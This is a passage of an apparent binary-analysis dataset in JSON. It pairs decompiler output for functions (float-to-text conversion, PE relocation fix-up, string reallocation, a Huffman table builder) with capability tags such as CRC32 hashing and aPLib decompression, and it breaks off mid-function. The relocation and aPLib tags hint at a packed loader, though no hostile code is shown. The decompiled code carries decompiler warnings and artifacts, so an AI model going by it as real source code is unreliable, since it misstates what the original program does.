0x2d;\n    }\n    if (uVar11 == 0) {\n        if ((arg_ch == 0) && (arg_8h == 0)) {\n            *arg_1ch = 0;\n            *(arg_1ch + 1) = ((var_60h != 0x8000) - 1U & 0xd) + 0x20;\n            *(arg_1ch + 3) = 0x3001;\n            *(arg_1ch + 5) = 0;\n            arg_8h = CONCAT22(var_1ch, var_20h._2_2_);\n            arg_ch = CONCAT22(var_1ah._2_2_, var_1ah);\n            goto code_r0x0043a017;\n        }\n    }\n    else if (uVar11 == 0x7fff) {\n        *arg_1ch = 1;\n        uVar11 = 0x80000000;\n        if ((arg_ch == 0x80000000) && (arg_8h == 0)) goto code_r0x00439848;\n        if ((arg_ch & 0x40000000) != 0) goto code_r0x00439848;\n        pcVar21 = \"1#SNAN\";\ncode_r0x0043988f:\n        iVar18 = fcn.00427d91(arg_1ch + 2, 0x16, pcVar21);\n        if (iVar18 != 0) {\n            do {\n                uVar11 = fcn.0042cf40();\n                arg_ch = extraout_ECX;\ncode_r0x00439848:\n                if (((arg_10h & 0x8000) == 0) || (arg_ch != 0xc0000000)) {\n                    if ((arg_ch != uVar11) || (arg_8h != 0)) goto code_r0x0043988a;\n                    pcVar21 = \"1#INF\";\n                }\n                else {\n                    if (arg_8h != 0) goto code_r0x0043988a;\n                    pcVar21 = \"1#IND\";\n                }\n                iVar18 = fcn.00427d91(arg_1ch + 2, 0x16, pcVar21);\n                if (iVar18 == 0) {\n                    *(arg_1ch + 3) = 5;\n                    goto code_r0x004398a5;\n                }\n            } while( true );\n        }\n        *(arg_1ch + 3) = 6;\ncode_r0x004398a5:\n        arg_8h = CONCAT22(var_1ch, var_20h._2_2_);\n        arg_ch = CONCAT22(var_1ah._2_2_, var_1ah);\n        goto code_r0x0043a017;\n    }\n    var_4ch._0_2_ = ((uVar11 >> 8) + (arg_ch >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar11 * 0x4d10 >> 0x10;\n    var_20h._0_2_ = 0;\n    uVar13 = var_4ch;\n    var_16h._0_1_ = uVar11;\n    var_16h._1_1_ = uVar11 >> 8;\n    var_1ah._0_2_ = arg_ch;\n    var_1ah._2_2_ = arg_ch >> 0x10;\n    var_20h._2_2_ = arg_8h;\n    var_1ch = arg_8h >> 0x10;\n    var_68h = 0x44e760;\n    if (-uVar13 != 0) {\n        uVar11 = -uVar13;\n        if (0 < uVar13) {\n            var_68h = 0x44e8c0;\n            uVar11 = uVar13;\n        }\njoined_r0x0043990e:\n        if (uVar11 != 0) {\n            var_68h = var_68h + 0x54;\n            uVar14 = uVar11 >> 3;\n            uVar13 = uVar11 & 7;\n            uVar11 = uVar14;\n            if (uVar13 != 0) {\n                piVar8 = uVar13 * 0xc + var_68h;\n                if (0x7fff < *piVar8) {\n                    var_3ch._0_2_ = *piVar8;\n                    var_3ch._2_2_ = *piVar8 >> 0x10;\n                    piVar2 = piVar8 + 2;\n                    var_38h._0_2_ = piVar8[1];\n                    var_38h._2_2_ = piVar8[1] >> 0x10;\n                    piVar8 = &var_3ch;\n                    var_34h = *piVar2;\n                    iVar18 = CONCAT22(var_38h, var_3ch._2_2_) + -1;\n                    var_3ch._2_2_ = iVar18;\n                    var_38h._0_2_ = iVar18 >> 0x10;\n                }\n                var_48h = 0;\n                var_10h._0_1_ = 0;\n                var_10h._1_1_ = 0;\n                var_10h._2_2_ = 0;\n                var_ch._0_2_ = 0;\n                var_ch._2_2_ = 0;\n                var_8h._0_2_ = 0;\n                var_8h._2_2_ = 0;\n                uVar9 = (*(piVar8 + 10) ^ CONCAT11(var_16h._1_1_, var_16h)) & 0x8000;\n                uVar10 = CONCAT11(var_16h._1_1_, var_16h) & 0x7fff;\n                uVar7 = *(piVar8 + 10) & 0x7fff;\n                uVar17 = uVar7 + uVar10;\n                if (((uVar10 < 0x7fff) && (uVar7 < 0x7fff)) && (uVar17 < 0xbffe)) {\n                    if (0x3fbf < uVar17) {\n                        if (((uVar10 == 0) &&\n                            (uVar17 = uVar17 + 1, \n                            (CONCAT13(var_16h._1_1_, CONCAT12(var_16h, arg_ch >> 0x10)) & 0x7fffffff) == 0)) &&\n                           ((CONCAT22(arg_ch, arg_8h >> 0x10) == 0 && (CONCAT22(arg_8h, var_20h) == 0)))) {\n                            var_16h._0_1_ = 0;\n                            var_16h._1_1_ = 0;\n                            goto joined_r0x0043990e;\n                        }\n                        if (((uVar7 != 0) || (uVar17 = uVar17 + 1,  (piVar8[2] & 0x7fffffffU) != 0)) ||\n                           ((piVar8[1] != 0 || (*piVar8 != 0)))) {\n                            var_54h = 0;\n                            puVar20 = &var_ch;\n                            var_40h = 5;\n                            do {\n                                var_50h = var_40h;\n                                if (0 < var_40h) {\n                                    var_70h = &var_20h + var_54h * 2;\n                                    var_6ch = piVar8 + 2;\n                                    do {\n                                        bVar5 = false;\n                                        uVar13 = puVar20[-1] + *var_70h * *var_6ch;\n                                        if ((uVar13 < puVar20[-1]) || (uVar13 < *var_70h * *var_6ch)) {\n                                            bVar5 = true;\n                                        }\n                                        puVar20[-1] = uVar13;\n                                        if (bVar5) {\n                                            *puVar20 = *puVar20 + 1;\n                                        }\n                                        var_70h = var_70h + 1;\n                                        var_6ch = var_6ch + -2;\n                                        var_50h = var_50h + -1;\n                                    } while (0 < var_50h);\n                                }\n                                puVar20 = puVar20 + 2;\n                                var_54h = var_54h + 1;\n                                var_40h = var_40h + -1;\n                            } while (0 < var_40h);\n                            uVar17 = uVar17 + 0xc002;\n                            if (uVar17 < 1) {\ncode_r0x00439ac1:\n                                uVar17 = uVar17 - 1;\n                                if (uVar17 < 0) {\n                                    uVar13 = -uVar17;\n                                    uVar17 = 0;\n                                    do {\n                                        if ((var_10h & 1) != 0) {\n                                            var_48h = var_48h + 1;\n                                        }\n                                        iVar3 = CONCAT22(var_8h._2_2_, var_8h);\n                                        uVar14 = CONCAT22(var_ch._2_2_, var_ch);\n                                        iVar18 = CONCAT22(var_ch._2_2_, var_ch);\n                                        var_8h._0_2_ = CONCAT22(var_8h._2_2_, var_8h) >> 1;\n                                        var_8h._2_2_ = var_8h._2_2_ >> 1;\n                                        var_ch._2_2_ = var_ch._2_2_ >> 1 | (iVar3 << 0x1f) >> 0x10;\n                                        uVar19 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) >> 1;\n                                        var_10h._2_2_ = var_10h._2_2_ >> 1 | (iVar18 << 0x1f) >> 0x10;\n                                        uVar13 = uVar13 - 1;\n                                        var_ch._0_2_ = uVar14 >> 1;\n                                        var_10h._0_1_ = uVar19;\n                                        var_10h._1_1_ = uVar19 >> 8;\n                                    } while (uVar13 != 0);\n                                    if (var_48h != 0) {\n                                        var_10h._0_1_ = var_10h | 1;\n                                    }\n                                }\n                            }\n                            else {\n                                do {\n                                    uVar10 = var_ch._2_2_;\n                                    uVar7 = var_10h._2_2_;\n                                    if ((var_8h._2_2_ & 0x8000) != 0) break;\n                                    iVar18 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) << 1;\n                                    var_10h._0_1_ = iVar18;\n                                    var_10h._1_1_ = iVar18 >> 8;\n                                    var_10h._2_2_ = iVar18 >> 0x10;\n                                    iVar18 = CONCAT22(var_ch._2_2_, var_ch) * 2;\n                                    var_ch._0_2_ = iVar18 | uVar7 >> 0xf;\n                                    var_ch._2_2_ = iVar18 >> 0x10;\n                                    iVar18 = CONCAT22(var_8h._2_2_, var_8h) * 2;\n                                    var_8h._0_2_ = iVar18 | uVar10 >> 0xf;\n                                    uVar17 = uVar17 - 1;\n                                    var_8h._2_2_ = iVar18 >> 0x10;\n                                } while (0 < uVar17);\n                                if (uVar17 < 1) goto code_r0x00439ac1;\n                            }\n                            if ((0x8000 < CONCAT11(var_10h._1_1_, var_10h)) ||\n                               ((CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) & 0x1ffff) == 0x18000)) {\n                                if (CONCAT22(var_ch, var_10h._2_2_) == -1) {\n                                    var_10h._2_2_ = 0;\n                                    var_ch._0_2_ = 0;\n                                    if (CONCAT22(var_8h, var_ch._2_2_) == -1) {\n                                        var_ch._2_2_ = 0;\n                                        var_8h._0_2_ = 0;\n                                        if (var_8h._2_2_ == 0xffff) {\n                                            var_8h._2_2_ = 0x8000;\n                                            uVar17 = uVar17 + 1;\n                                        }\n                                        else {\n                                            var_8h._2_2_ = var_8h._2_2_ + 1;\n                                        }\n                                    }\n                                    else {\n                                        iVar18 = CONCAT22(var_8h, var_ch._2_2_) + 1;\n                                        var_ch._2_2_ = iVar18;\n                                        var_8h._0_2_ = iVar18 >> 0x10;\n                                    }\n                                }\n                                else {\n                                    iVar18 = CONCAT22(var_ch, var_10h._2_2_) + 1;\n                                    var_10h._2_2_ = iVar18;\n                                    var_ch._0_2_ = iVar18 >> 0x10;\n                                }\n                            }\n                            if (uVar17 < 0x7fff) {\n                                var_16h._1_1_ = uVar17 >> 8 | uVar9 >> 8;\n                                var_20h._0_2_ = var_10h._2_2_;\n                                var_20h._2_2_ = var_ch;\n                                var_1ch = var_ch._2_2_;\n                                arg_8h = CONCAT22(var_ch._2_2_, var_ch);\n                                var_1ah._0_2_ = var_8h;\n                                var_1ah._2_2_ = var_8h._2_2_;\n                                arg_ch = CONCAT22(var_8h._2_2_, var_8h);\n                                var_16h._0_1_ = uVar17;\n                            }\n                            else {\n                                var_1ch = 0;\n                                var_1ah._0_2_ = 0;\n                                var_20h._0_2_ = 0;\n                                var_20h._2_2_ = 0;\n                                arg_8h = 0;\n                                iVar18 = ((uVar9 == 0) - 1 & 0x80000000) + 0x7fff8000;\n                                var_1ah._2_2_ = iVar18;\n                                arg_ch = 0x80000000;\n                                var_16h._0_1_ = iVar18 >> 0x10;\n                                var_16h._1_1_ = iVar18 >> 0x18;\n                            }\n                            goto joined_r0x0043990e;\n                        }\n                    }\n                    var_1ah._2_2_ = 0;\n                    var_16h._0_1_ = 0;\n                    var_16h._1_1_ = 0;\n                }\n                else {\n                    iVar18 = ((uVar9 == 0) - 1 & 0x80000000) + 0x7fff8000;\n                    var_1ah._2_2_ = iVar18;\n                    var_16h._0_1_ = iVar18 >> 0x10;\n                    var_16h._1_1_ = iVar18 >> 0x18;\n                }\n                var_1ch = 0;\n                var_1ah._0_2_ = 0;\n                arg_ch = var_1ah._2_2_ << 0x10;\n                var_20h._0_2_ = 0;\n                var_20h._2_2_ = 0;\n                arg_8h = 0;\n            }\n            goto joined_r0x0043990e;\n        }\n    }\n    var_1ch = arg_8h >> 0x10;\n    var_20h._2_2_ = arg_8h;\n    var_1ah._2_2_ = arg_ch >> 0x10;\n    var_1ah._0_2_ = arg_ch;\n    uVar11 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_));\n    if (0x3ffe < uVar11 >> 0x10) {\n        var_4ch._0_2_ = var_4ch + 1;\n        var_50h = 0;\n        var_10h._0_1_ = 0;\n        var_10h._1_1_ = 0;\n        var_10h._2_2_ = 0;\n        var_ch._0_2_ = 0;\n        var_ch._2_2_ = 0;\n        var_8h._0_2_ = 0;\n        var_8h._2_2_ = 0;\n        uVar11 = uVar11 >> 0x10 & 0x7fff;\n        iVar18 = uVar11 + 0x3ffb;\n        if ((uVar11 < 0x7fff) && (iVar18 < 0xbffe)) {\n            if (0x3fbf < iVar18) {\n                if ((((uVar11 == 0) &&\n                     (iVar18 = uVar11 + 0x3ffc, \n                     (CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) & 0x7fffffff) == 0)) &&\n                    (CONCAT22(var_1ah, var_1ch) == 0)) && (CONCAT22(var_20h._2_2_, var_20h) == 0)) {\n                    var_16h._0_1_ = 0;\n                    var_16h._1_1_ = 0;\n                    goto code_r0x00439e4f;\n                }\n                var_54h = 0;\n                puVar20 = &var_ch;\n                var_40h = 5;\n                do {\n                    var_48h = var_40h;\n                    if (0 < var_40h) {\n                        var_58h = &var_28h;\n                        puVar6 = &var_20h + var_54h * 2;\n                        do {\n                            bVar5 = false;\n                            uVar11 = puVar20[-1] + *var_58h * *puVar6;\n                            if ((uVar11 < puVar20[-1]) || (uVar11 < *var_58h * *puVar6)) {\n                                bVar5 = true;\n                            }\n                            puVar20[-1] = uVar11;\n                            if (bVar5) {\n                                *puVar20 = *puVar20 + 1;\n                            }\n                            var_58h = var_58h + -2;\n                            puVar6 = puVar6 + 1;\n                            var_48h = var_48h + -1;\n                        } while (0 < var_48h);\n                    }\n                    puVar20 = puVar20 + 2;\n                    var_54h = var_54h + 1;\n                    var_40h = var_40h + -1;\n                } while (0 < var_40h);\n                iVar18 = iVar18 + 0xc002;\n                if (iVar18 < 1) {\ncode_r0x00439d4a:\n                    uVar17 = iVar18 + 0xffff;\n                    if (uVar17 < 0) {\n                        uVar11 = -(iVar18 + 0xffff) & 0xffff;\n                        uVar17 = uVar17 + uVar11;\n                        do {\n                            if ((var_10h & 1) != 0) {\n                                var_50h = var_50h + 1;\n                            }\n                            iVar3 = CONCAT22(var_8h._2_2_, var_8h);\n                            uVar13 = CONCAT22(var_ch._2_2_, var_ch);\n                            iVar18 = CONCAT22(var_ch._2_2_, var_ch);\n                            var_8h._0_2_ = CONCAT22(var_8h._2_2_, var_8h) >> 1;\n                            var_8h._2_2_ = var_8h._2_2_ >> 1;\n                            var_ch._2_2_ = var_ch._2_2_ >> 1 | (iVar3 << 0x1f) >> 0x10;\n                            uVar14 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) >> 1;\n                            var_10h._2_2_ = var_10h._2_2_ >> 1 | (iVar18 << 0x1f) >> 0x10;\n                            uVar11 = uVar11 - 1;\n                            var_ch._0_2_ = uVar13 >> 1;\n                            var_10h._0_1_ = uVar14;\n                            var_10h._1_1_ = uVar14 >> 8;\n                        } while (uVar11 != 0);\n                        if (var_50h != 0) {\n                            var_10h._0_1_ = var_10h | 1;\n                        }\n                    }\n                }\n                else {\n                    do {\n                        uVar7 = var_ch._2_2_;\n                        uVar17 = var_10h._2_2_;\n                        if (var_8h._2_2_ < 0) break;\n                        iVar3 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) << 1;\n                        var_10h._0_1_ = iVar3;\n                        var_10h._1_1_ = iVar3 >> 8;\n                        var_10h._2_2_ = iVar3 >> 0x10;\n                        iVar3 = CONCAT22(var_ch._2_2_, var_ch) * 2;\n                        var_ch._0_2_ = iVar3 | uVar17 >> 0xf;\n                        var_ch._2_2_ = iVar3 >> 0x10;\n                        iVar3 = CONCAT22(var_8h._2_2_, var_8h) * 2;\n                        var_8h._0_2_ = iVar3 | uVar7 >> 0xf;\n                        iVar18 = iVar18 + 0xffff;\n                        var_8h._2_2_ = iVar3 >> 0x10;\n                    } while (0 < iVar18);\n                    uVar17 = iVar18;\n                    if (uVar17 < 1) goto code_r0x00439d4a;\n                }\n                if ((0x8000 < CONCAT11(var_10h._1_1_, var_10h)) ||\n                   ((CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) & 0x1ffff) == 0x18000)) {\n                    if (CONCAT22(var_ch, var_10h._2_2_) == -1) {\n                        var_10h._2_2_ = 0;\n                        var_ch._0_2_ = 0;\n                        if (CONCAT22(var_8h, var_ch._2_2_) == -1) {\n                            var_ch._2_2_ = 0;\n                            var_8h._0_2_ = 0;\n                            if (var_8h._2_2_ == 0xffff) {\n                                var_8h._2_2_ = 0x8000;\n                                uVar17 = uVar17 + 1;\n                            }\n                            else {\n                                var_8h._2_2_ = var_8h._2_2_ + 1;\n                            }\n                        }\n                        else {\n                            iVar18 = CONCAT22(var_8h, var_ch._2_2_) + 1;\n                            var_ch._2_2_ = iVar18;\n                            var_8h._0_2_ = iVar18 >> 0x10;\n                        }\n                    }\n                    else {\n                        iVar18 = CONCAT22(var_ch, var_10h._2_2_) + 1;\n                        var_10h._2_2_ = iVar18;\n                        var_ch._0_2_ = iVar18 >> 0x10;\n                    }\n                }\n                if (uVar17 < 0x7fff) {\n                    var_16h._1_1_ = uVar17 >> 8 | var_16h._1_1_ & 0x80;\n                    var_20h._0_2_ = var_10h._2_2_;\n                    arg_8h = CONCAT22(var_ch._2_2_, var_ch);\n                    arg_ch = CONCAT22(var_8h._2_2_, var_8h);\n                    var_16h._0_1_ = uVar17;\n                }\n                else {\n                    var_20h._0_2_ = 0;\n                    arg_8h = 0;\n                    iVar18 = (((var_16h._1_1_ & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;\n                    arg_ch = 0x80000000;\n                    var_16h._0_1_ = iVar18 >> 0x10;\n                    var_16h._1_1_ = iVar18 >> 0x18;\n                }\n                goto code_r0x00439e4f;\n            }\n            iVar18 = 0;\n        }\n        else {\n            iVar18 = (((var_16h._1_1_ & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;\n        }\n        arg_8h = 0;\n        var_20h._0_2_ = 0;\n        arg_ch = iVar18 << 0x10;\n        var_16h._0_1_ = iVar18 >> 0x10;\n        var_16h._1_1_ = iVar18 >> 0x18;\n    }\ncode_r0x00439e4f:\n    *arg_1ch = var_4ch;\n    if (((arg_18h & 1) == 0) || (arg_14h = arg_14h + var_4ch,  0 < arg_14h)) {\n        if (0x15 < arg_14h) {\n            arg_14h = 0x15;\n        }\n        iVar18 = CONCAT11(var_16h._1_1_, var_16h) - 0x3ffe;\n        var_16h._0_1_ = 0;\n        var_16h._1_1_ = 0;\n        var_44h = 8;\n        do {\n            var_1ah._2_2_ = arg_ch >> 0x10;\n            var_1ah._0_2_ = arg_ch;\n            var_1ch = arg_8h >> 0x10;\n            var_20h._2_2_ = arg_8h;\n            uVar17 = var_20h._2_2_;\n            iVar3 = CONCAT22(var_20h._2_2_, var_20h) << 1;\n            var_20h._0_2_ = iVar3;\n            var_20h._2_2_ = iVar3 >> 0x10;\n            iVar3 = CONCAT22(var_1ah, var_1ch) * 2;\n            var_1ch = iVar3 | uVar17 >> 0xf;\n            arg_8h = CONCAT22(var_1ch, var_20h._2_2_);\n            iVar4 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) * 2;\n            var_1ah._2_2_ = iVar4 | var_1ah >> 0xf;\n            var_44h = var_44h + -1;\n            var_1ah._0_2_ = iVar3 >> 0x10;\n            arg_ch = CONCAT22(var_1ah._2_2_, var_1ah);\n            var_16h._0_1_ = iVar4 >> 0x10;\n            var_16h._1_1_ = iVar4 >> 0x18;\n        } while (var_44h != 0);\n        if ((iVar18 < 0) && (uVar11 = -iVar18 & 0xff,  uVar11 != 0)) {\n            do {\n                iVar3 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_));\n                uVar14 = CONCAT22(var_1ah, var_1ch);\n                iVar18 = CONCAT22(var_1ah, var_1ch);\n                uVar13 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) >> 1;\n                var_1ah._2_2_ = uVar13;\n                var_16h._0_1_ = uVar13 >> 0x10;\n                var_16h._1_1_ = var_16h._1_1_ >> 1;\n                var_1ah._0_2_ = var_1ah >> 1 | (iVar3 << 0x1f) >> 0x10;\n                uVar13 = CONCAT22(var_20h._2_2_, var_20h);\n                var_20h._2_2_ = var_20h._2_2_ >> 1 | (iVar18 << 0x1f) >> 0x10;\n                uVar11 = uVar11 - 1;\n                var_1ch = uVar14 >> 1;\n                var_20h._0_2_ = uVar13 >> 1;\n            } while (0 < uVar11);\n        }\n        arg_14h = arg_14h + 1;\n        piVar1 = arg_1ch + 2;\n        piVar15 = piVar1;\n        uVar17 = var_20h;\n        uVar7 = var_20h._2_2_;\n        uVar9 = var_1ch;\n        uVar10 = var_1ah;\n        while( true ) {\n            arg_ch = CONCAT22(var_1ah._2_2_, uVar10);\n            arg_8h = CONCAT22(uVar9, uVar7);\n            if (arg_14h < 1) break;\n            var_34h = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_));\n            uVar13 = CONCAT22(uVar7, uVar17) * 4;\n            uVar11 = CONCAT22(uVar10, uVar9) * 2;\n            uVar14 = (CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) * 2 | uVar10 >> 0xf) * 2 |\n                     uVar11 >> 0x1f;\n            uVar19 = (uVar11 | uVar7 >> 0xf) * 2 | (CONCAT22(uVar7, uVar17) << 1) >> 0x1f;\n            uVar11 = CONCAT22(uVar7, uVar17) + uVar13;\n            if ((uVar11 < uVar13) || (uVar13 = uVar19,  uVar11 < CONCAT22(uVar7, uVar17))) {\n                uVar13 = uVar19 + 1;\n                bVar5 = false;\n                if ((uVar13 < uVar19) || (uVar13 == 0)) {\n                    bVar5 = true;\n                }\n                if (bVar5) {\n                    uVar14 = uVar14 + 1;\n                }\n            }\n            uVar19 = CONCAT22(uVar10, uVar9) + uVar13;\n            if ((uVar19 < uVar13) || (uVar19 < CONCAT22(uVar10, uVar9))) {\n                uVar14 = uVar14 + 1;\n            }\n            iVar18 = (uVar14 + var_34h) * 2;\n            var_1ah._2_2_ = iVar18 | uVar19 >> 0x1f;\n            var_20h._0_2_ = uVar11 * 2;\n            var_20h._2_2_ = uVar11 * 2 >> 0x10;\n            var_16h._0_1_ = iVar18 >> 0x10;\n            var_1ch = uVar19 * 2 | uVar11 >> 0x1f;\n            *piVar15 = (iVar18 >> 0x18) + '0';\n            piVar15 = piVar15 + 1;\n            arg_14h = arg_14h + -1;\n            var_1ah._0_2_ = uVar19 * 2 >> 0x10;\n            var_16h._1_1_ = 0;\n            var_3ch._0_2_ = uVar17;\n            var_3ch._2_2_ = uVar7;\n            var_38h._0_2_ = uVar9;\n            var_38h._2_2_ = uVar10;\n            uVar17 = var_20h;\n            uVar7 = var_20h._2_2_;\n            uVar9 = var_1ch;\n            uVar10 = var_1ah;\n        }\n        piVar16 = piVar15 + -1;\n        var_20h._0_2_ = uVar17;\n        if (*(piVar15 + -1) < '5') {\n            for (; (piVar1 <= piVar16 && (*piVar16 == '0')); piVar16 = piVar16 + -1) {\n            }\n            if (piVar16 < piVar1) {\n                *arg_1ch = 0;\n                *(arg_1ch + 3) = 1;\n                *(arg_1ch + 1) = ((var_60h != 0x8000) - 1U & 0xd) + 0x20;\n                *piVar1 = 0x30;\n                *(arg_1ch + 5) = 0;\n                goto code_r0x0043a017;\n            }\n        }\n        else {\n            for (; (piVar1 <= piVar16 && (*piVar16 == '9')); piVar16 = piVar16 + -1) {\n                *piVar16 = 0x30;\n            }\n            if (piVar16 < piVar1) {\n                piVar16 = piVar16 + 1;\n                *arg_1ch = *arg_1ch + 1;\n            }\n            *piVar16 = *piVar16 + '\\x01';\n        }\n        cVar12 = (piVar16 - arg_1ch) + -3;\n        *(arg_1ch + 3) = cVar12;\n        *(cVar12 + 4 + arg_1ch) = 0;\n    }\n    else {\n        *arg_1ch = 0;\n        *(arg_1ch + 3) = 0x3001;\n        *(arg_1ch + 1) = ((var_60h != 0x8000) - 1U & 0xd) + 0x20;\n        *(arg_1ch + 5) = 0;\n    }\ncode_r0x0043a017:\n    unique0x100008d2 = arg_8h;\n    var_1ah = arg_ch;\n    fcn.00427841(1);\n    return;\ncode_r0x0043988a:\n    pcVar21 = \"1#QNAN\";\n    goto code_r0x0043988f;\n}\n",
        "token_count": 8785
    },
    "004044c0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint fcn.004044c0(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint16_t uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    \n    iVar3 = *(param_1 + 0x74);\n    if (*(param_1 + 0x144) == iVar3) {\n        return 0;\n    }\n    if ((*(param_1 + 0xe0) != 0) && (*(param_1 + 0xe4) != 0)) {\n        iVar4 = *(param_1 + 0x144);\n        piVar6 = *(param_1 + 0xe0) + iVar4;\n        piVar2 = *(param_1 + 0xe4) + -8 + piVar6;\n        do {\n            if (piVar2 <= piVar6) {\n                return 0;\n            }\n            uVar8 = piVar6[1] - 8U >> 1;\n            piVar9 = piVar6 + 2;\n            uVar7 = 0;\n            if (uVar8 != 0) {\n                do {\n                    uVar5 = *piVar9 >> 0xc;\n                    if (uVar5 != 0) {\n                        if (uVar5 != 3) {\n                            return 5;\n                        }\n                        piVar1 = (*piVar9 & 0xfff) + *piVar6 + *(param_1 + 0x144);\n                        *piVar1 = *piVar1 + (iVar4 - iVar3);\n                    }\n                    uVar7 = uVar7 + 1;\n                    piVar9 = piVar9 + 2;\n                } while (uVar7 < uVar8);\n            }\n            piVar6 = piVar6 + piVar6[1];\n        } while( true );\n    }\n    return 4;\n}\n",
        "token_count": 454
    },
    "00404c20": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_3\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __thiscall fcn.00404c20(uint *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *arg_8h;\n    uint *arg_ch;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_4h;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack60;\n    code *apcStack44 [3];\n    uint32_t var_28h;\n    uint uStack28;\n    uint *puStack24;\n    uint32_t *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h_2;\n    uint var_ch_3;\n    \n    var_14h = 0x43aa10;\n    var_18h = *in_FS_OFFSET;\n    uStack60 = *0x44d6a0 ^ &var_ch_3;\n    var_1ch = &uStack60;\n    *in_FS_OFFSET = &var_18h;\n    uVar4 = var_4h | 0xf;\n    uVar5 = var_4h;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = param_1[5];\n        uVar3 = uVar1 >> 1;\n        uVar5 = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar5 = uVar3 + uVar1,  -uVar3 - 2 < uVar1)) {\n            uVar5 = 0xfffffffe;\n        }\n    }\n    arg_8h = NULL;\n    var_10h_2 = 0;\n    puStack24 = param_1;\n    puVar2 = &uStack60;\n    if ((uVar5 + 1 != 0) && (arg_8h = fcn.00427f31(uVar5 + 1),  puVar2 = var_1ch,  arg_8h == NULL)) {\n        uStack28 = 0;\n        fcn.004278d8(&uStack28);\n        apcStack44[0] = vtable.std::bad_alloc.0;\n        fcn.00427fb1(apcStack44, 0x44a520);\n        var_28h = var_4h;\n        var_10h_2 = CONCAT31(var_10h_2._1_3_, 2);\n        var_1ch = &stack0xffffffb8;\n        fcn.00404bc0(var_4h + 1);\n        return 0x404cf6;\n    }\n    var_1ch = puVar2;\n    if (param_3 != 0) {\n        arg_ch = param_1;\n        if (0xf < param_1[5]) {\n            arg_ch = *param_1;\n        }\n        fcn.004274e0(arg_8h, arg_ch, param_3);\n    }\n    if (0xf < param_1[5]) {\n        fcn.00427a17();\n    }\n    *param_1 = 0;\n    *param_1 = arg_8h;\n    param_1[5] = uVar5;\n    param_1[4] = param_3;\n    if (0xf < uVar5) {\n        param_1 = arg_8h;\n    }\n    *(param_1 + param_3) = 0;\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 857
    },
    "00405910": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405910(int32_t *param_1, uint32_t param_2, uint32_t param_3, int32_t param_4, int32_t param_5, \n                 uint32_t *param_6, uint32_t *param_7, int32_t param_8, uint32_t *param_9, uint32_t *param_10)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    uint8_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    int32_t iVar15;\n    uint32_t in_stack_fffffef4;\n    uint32_t uStack264;\n    uint32_t uStack260;\n    uint32_t *puStack256;\n    uint32_t uStack244;\n    uint32_t uStack240;\n    uint32_t *puStack236;\n    uint uStack232;\n    uint32_t uStack228;\n    int32_t iStack216;\n    uint32_t auStack196 [16];\n    uint32_t auStack132 [16];\n    uint32_t auStack68 [16];\n    uint32_t uStack4;\n    \n    uStack4 = *0x44d6a0 ^ &stack0xfffffef4;\n    auStack132[0] = 0;\n    auStack132[1] = 0;\n    auStack132[2] = 0;\n    auStack132[3] = 0;\n    auStack132[4] = 0;\n    auStack132[5] = 0;\n    auStack132[6] = 0;\n    auStack132[7] = 0;\n    auStack132[8] = 0;\n    auStack132[9] = 0;\n    auStack132[10] = 0;\n    auStack132[11] = 0;\n    auStack132[12] = 0;\n    auStack132[13] = 0;\n    auStack132[14] = 0;\n    auStack132[15] = 0;\n    piVar5 = param_1;\n    uVar14 = param_2;\n    do {\n        auStack132[*piVar5] = auStack132[*piVar5] + 1;\n        piVar5 = piVar5 + 1;\n        uVar14 = uVar14 - 1;\n    } while (uVar14 != 0);\n    if (auStack132[0] == param_2) {\n        *param_6 = 0;\n        *param_7 = 0;\n    }\n    else {\n        uStack264 = 1;\n        do {\n            if (auStack132[uStack264] != 0) break;\n            uStack264 = uStack264 + 1;\n        } while (uStack264 < 0x10);\n        